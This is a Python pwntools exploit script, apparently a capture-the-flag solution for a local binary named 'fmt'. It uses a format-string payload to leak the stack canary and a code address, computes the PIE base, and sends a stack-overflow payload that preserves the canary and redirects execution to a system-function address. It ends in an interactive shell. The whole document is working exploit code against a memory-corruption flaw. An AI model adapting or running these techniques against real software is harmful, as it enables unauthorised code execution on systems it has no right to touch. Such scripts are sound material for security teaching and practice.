from pwn import*
context.log_level = 'debug'
p = process('./fmt')
elf = ELF('./fmt')
libc = ELF('./libc.so.6')
payload='%13$p\n%15$p'
# gdb.attach(p)
# pause()
p.recvuntil('(Format String)')
p.sendline(payload)
p.recvuntil('Hello, ')
leak=int(p.recvline().strip(),16)
canary=int(p.recvline().strip(),16)
print(hex(canary))
print(hex(leak))
offset=0x141A+47
pie_base=leak-offset
print(hex(pie_base))
system=pie_base+0x1290
payload1=b'a'*40+p64(canary)+b'a'*8+p64(system)
p.recvuntil('(Stack Overflow)')
p.sendline(payload1)
p.interactive()